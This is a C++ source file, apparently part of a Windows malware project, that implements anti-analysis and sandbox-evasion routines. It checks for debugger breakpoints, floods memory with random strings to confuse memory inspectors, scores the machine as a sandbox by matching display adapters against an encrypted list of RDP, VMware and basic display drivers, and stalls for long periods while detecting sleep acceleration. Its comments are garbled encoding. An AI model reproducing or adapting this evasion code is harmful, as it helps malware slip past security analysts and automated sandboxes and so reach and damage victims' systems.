#include "antianalysis.h"
#include "utils.hpp"
#include "strings.hpp"

BOOL antianalysis::check_for_breakpoint(LPBYTE lpFunctionEntry)
{
	return (lpFunctionEntry[0] == 0xCC);
}

static VOID generate_string(LPBYTE lpMemory, SIZE_T dwMemorySize, DWORD dwAmount, DWORD dwSleepTime)
{
	UINT iCounter = 0;
	long holdrand = GetTickCount();
	for (;;)
	{
		if ((dwAmount != INFINITE) && (iCounter >= dwAmount))
			break;

		// ����������� ������ ������ ������ ���� ����� 10 ��������� ����� ����������� � process hacker � ��������� ��������
		UINT iLengthGenerated = 0;

		// ��������� �����
		for (;;)
		{
			UINT iStringLength = _rand(&holdrand) % 16 + 10;
			// ���������� ���� ������ � ���� � �������� ��������� ������ ��������������� �������� ��������� ������ ������, �� �������
			for (UINT iIndex = 0; iIndex < iStringLength; iIndex++)
			{
				if (iLengthGenerated >= dwMemorySize)
					break;

				lpMemory[iLengthGenerated++] = _rand(&holdrand) % ('z' - 'a') + 'a';
			}

			if (iLengthGenerated >= dwMemorySize)
				break;

			lpMemory[iLengthGenerated++] = '\0';
		}

		if (dwAmount != INFINITE)
			iCounter++;

		Sleep(dwSleepTime);
	}

	return;
}

// ��������� ��������� ��������� ��� ������ � ������ � �������� ����������� ������, ����������� ����� ���������������� ����������� ����� � ������ �� �����
// ��� ����� ���� ���� ����� - �� ����� ������� � ������ ��������������� ��������
static DWORD WINAPI TrashMemory(LPVOID lpParameter)
{
	UNREFERENCED_PARAMETER(lpParameter);
#ifdef _DEBUG
	WriteLog(L"[TrashMemory] trashing memory with generated trash-strings");
#endif
	
	DWORD dwMemorySize = 1024 * 10;
	LPBYTE lpMemory = new BYTE[dwMemorySize + 1];
	if (lpMemory != nullptr)
	{
		generate_string(lpMemory, dwMemorySize - 1, 1024, 1);
		delete[]lpMemory;
	}

#ifdef _DEBUG
	WriteLog(L"[TrashMemory] flooding-generation finished");
#endif

	ExitThread(0);
}

BOOL antianalysis::exec_all_longterm()
{
#ifdef _DEBUG
	WriteLog(L"[antianalysis::exec_all_longterm] executing all longterm anti-analysis measures");
#endif

	BOOL bRet = FALSE;
	HANDLE hThread = NULL;
	do
	{
		hThread = CreateThread(NULL, NULL, TrashMemory, NULL, 0, NULL);
		if (hThread != NULL)
			CloseHandle(hThread);

	} while (FALSE);

	return bRet;
}

antisbx::SandboxDelayMachineEntry::SandboxDelayMachineEntry()
{
#ifdef _DEBUG
	WriteLog(L"[SandboxDelayMachineEntry] constructor");
#endif
}

antisbx::SandboxDelayMachineEntry::~SandboxDelayMachineEntry()
{
#ifdef _DEBUG
	WriteLog(L"[SandboxDelayMachineEntry] destructor");
#endif
}

BOOL antisbx::SandboxDelayMachineEntry::enter()
{
	if (global_data::pExtendedDataCopy->dwWayInfected & M0YV_FNO_ANTISBX)
		return TRUE;

#ifdef _DEBUG
	WCHAR debugOut[1024];
	WriteLog(L"[SandboxDelayMachineEntry::enter] enter anti-sandbox");
#endif
	BOOL bRet = FALSE;
	
	INT iScore = 0;
	do
	{
		if (!this->check_required())
		{
#ifdef _DEBUG
			WriteLog(L"[SandboxDelayMachineEntry::enter] check is not required, skipping delay");
#endif
			bRet = TRUE;
			break;
		}

		// ��������� �������������� �������� - ��������� ����� � � ����������� �� ���������� ������ ������ �� ��������������� �����
		iScore = this->get_score();

#ifdef _DEBUG
		wsprintfW(debugOut, L"[SandboxDelayMachineEntry::entry] score = %d", iScore);
		WriteLog(debugOut);
#endif

		// �������� �� ���������, ��� ��� ��������� ������ �� �������������
		if (iScore <= 0)
		{
#ifdef _DEBUG
			WriteLog(L"[SandboxDelayMachineEntry::enter] no positive score so no delay");
#endif
			bRet = TRUE;
			break;
		}

		// ��� score � 1 �������� 2.1 ������� ��� �������� �� �������� Sleep
		if (iScore == 1)
		{
			bRet = this->delay(2100);
			break;
		}

		// ��� ��������� score > 1 �������� 100 ������ ��� ������� ����� ����� 1 �������

		bRet = TRUE; // ������ TRUE �� ��������� ���� Sleep �� ���������� � �� ������������� �������� 100 ��� �� ������ ����
		for (UINT iCounter = 0; iCounter < (iScore - 1); iCounter++)
		{
			bRet &= this->delay(100 * 1000); // delay ������ false ���� �� �������� ������ ���������� ������� � Sleep ��� ����������
		}


	} while (FALSE);

	return bRet;
}

BOOL antisbx::SandboxDelayMachineEntry::check_required()
{
#ifdef _DEBUG
	WriteLog(L"[SandboxDelayMachineEntry::check_required] checking if sandbox analysis required");
#endif

	BOOL bRet = FALSE;
	
	do
	{
		// ����� ���� ������ ��������, � ������ ���� ����� �� �������� ���������� TRUE, �� �������, ��� ������ �������� �� �������� ���������� � ������ ���� ��������

		// ���� ��� �� ������ ���� ��������� �� ������ ������, �� ��� �� ���������, ���� �������� �� ��������� ��� ������ ������� ���� false negative
		// ��� ��������� ������� ���� �� �������� exe ��� ����� ���������, ��� ��� ������ ����, ��� ��� �������� ���� ����� hid ������, ������� �������� ������� �������� ������ � �������
		// �� ������ ���� - ��� ����� �������� ����������� ������ ����� ������ � ���������� �� ��� ����������� ��������� 
		if (!this->is_entry_machine())
			break;

		// ���� ���� � �������� �� ����������� �� ����� ������������ ���������
		if (this->is_whitelist_path())
			break;

		// �������� �� ����� ������ ���� ��������, � ������ ��� ������ ����� ��������� ����������, ����� �������������� ��������
		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

BOOL antisbx::SandboxDelayMachineEntry::is_whitelist_path()
{
	CONST UINT iPathLength = 1024;
	WCHAR wchSelfPath[iPathLength + 1];
	WCHAR wchWindowsPath[iPathLength + 1];

	BOOL bRet = FALSE;
	do
	{
		if (!GetModuleFileNameW(NULL, wchSelfPath, iPathLength))
			break;

		if (!GetWindowsDirectoryW(wchWindowsPath, iPathLength))
			break;

		// ��������, ��� ������ ���� \\, ��� �������� ������������� ��������� ��� ����� ��������, ����� �� ���� �� ������� ����� ���������
		// ��-�� ����� ����� �� ����� ������� �������������, ��� ������ ����������� EXE ���� �� ������ ���� �������� �� �������� ����������
		if ((wchSelfPath[0] == L'\\') && (wchSelfPath[1] == L'\\'))
		{
#ifdef _DEBUG
			WriteLog(L"[SandboxDelayMachineEntry::is_whitelist_path] executed from double backslashed path which is whitelisted");
#endif
			bRet = TRUE;
			break;
		}

		// ��������, ��� ������� ���� � �������� �������� != ���������� ����� � ��� ��� removable ��� remote
		// ��� ��� ����� ������� ����� ������������ ��� ��������
		wchSelfPath[3] = L'\0';
		DWORD dwCurrentDriveType = GetDriveTypeW(wchSelfPath);
		if ((((dwCurrentDriveType == DRIVE_REMOVABLE) || (dwCurrentDriveType == DRIVE_REMOTE))) && (wchSelfPath[0] != wchWindowsPath[0]))
		{
#ifdef _DEBUG
			WriteLog(L"[SandboxDelayMachineEntry::is_whitelist_path] executed from removable or remote drive which is not equal to system drive and is whitelisted pattern");
#endif
			bRet = TRUE;
			break;
		}
		

	} while (FALSE);

	return bRet;
}

BOOL antisbx::SandboxDelayMachineEntry::is_entry_machine()
{
	return is_machine_firstexec();
}

INT antisbx::SandboxDelayMachineEntry::get_score()
{
	INT iScore = 1; // ��������� �������� ������

	if (this->isNoGraphics())
		iScore++;

	return iScore;
}

BOOL antisbx::SandboxDelayMachineEntry::isNoGraphics()
{
	UINT iDeviceNum = 0;
	DISPLAY_DEVICEW dispDevice;
	RtlSecureZeroMemory(&dispDevice, sizeof(dispDevice));

	dispDevice.cb = sizeof(DISPLAY_DEVICEW);

	CONST UINT iAmountGraphics = 9;
	CCryptString cStr_rdpdd(cryptedstr_rdpdd);
	CCryptString cStr_netmeeting(cryptedstr_netmeeting);
	CCryptString cStr_rdpencodermirrordriver(cryptedstr_rdpencodermirrordriver);
	CCryptString cStr_rdpreflectormirrordriver(cryptedstr_rdpreflectormirrordriver);
	CCryptString cStr_vmwaresvga3d(cryptedstr_vmwaresvga3d);
	CCryptString cStr_standardvgagraphicsadapter(cryptedstr_standardvgagraphicsadapter);
	CCryptString cStr_rdpuddchaineddd(cryptedstr_rdpuddchaineddd);
	CCryptString cStr_microsoftbasicdisplayadapter(cryptedstr_microsoftbasicdisplayadapter);
	CCryptString cStr_microsoftbasicrenderdriver(cryptedstr_microsoftbasicrenderdriver);

	PWCHAR pDecrypted[iAmountGraphics];

	pDecrypted[0] = cStr_rdpdd.w_str();
	pDecrypted[1] = cStr_netmeeting.w_str();
	pDecrypted[2] = cStr_rdpencodermirrordriver.w_str();
	pDecrypted[3] = cStr_rdpreflectormirrordriver.w_str();
	pDecrypted[4] = cStr_vmwaresvga3d.w_str();
	pDecrypted[5] = cStr_standardvgagraphicsadapter.w_str();
	pDecrypted[6] = cStr_rdpuddchaineddd.w_str();
	pDecrypted[7] = cStr_microsoftbasicdisplayadapter.w_str();
	pDecrypted[8] = cStr_microsoftbasicrenderdriver.w_str();
	// TODO: �������� strstr VirtualBox

	while (EnumDisplayDevicesW(NULL, iDeviceNum, &dispDevice, NULL))
	{
#ifdef _DEBUG
		WriteLog(L"[SandboxDelayMachineEntry::isNoGraphics] device name is ", dispDevice.DeviceString);
#endif
		if (!this->isBlacklisted(pDecrypted, sizeof(pDecrypted) / sizeof(PWCHAR), dispDevice.DeviceString))
			return FALSE;
	}

	// ���� ����� ����, �� ���� ��� ����������� ���������, ���� ��� ��� �� ������� ������
	return TRUE;
}

BOOL antisbx::SandboxDelayMachineEntry::isBlacklisted(PWCHAR *pwBlacklist, UINT iBlacklistAmount, PWCHAR pwString)
{
	for (UINT iIndex = 0; iIndex < iBlacklistAmount; iIndex++)
	{
		if (_wcsicmp(pwBlacklist[iIndex], pwString) == 0)
			return TRUE;
	}

	return FALSE;
}

// �������� ��� ������� ���� ����, ���� WaitForSingleObject �� ������ �� ��������, �� � ��� ������� Sleep �� �������� ������ ��������
static DWORD WINAPI ThreadLongSleep(LPVOID lpParameter)
{
	UNREFERENCED_PARAMETER(lpParameter);

	Sleep(10000 * 1000);

	ExitThread(0);
}

BOOL antisbx::SandboxDelayMachineEntry::delay(DWORD dwMilliseconds)
{
	BOOL bRet = FALSE;

	HANDLE hThread = CreateThread(NULL, NULL, ThreadLongSleep, NULL, NULL, NULL);
	if (hThread)
	{
		// true ������ ������ � ������ ���� �������� ����������� �����, ����� Sleep ��� ������
		bRet = (WaitForSingleObject(hThread, dwMilliseconds) == WAIT_TIMEOUT);
		CloseHandle(hThread);
	}

	return bRet;
}
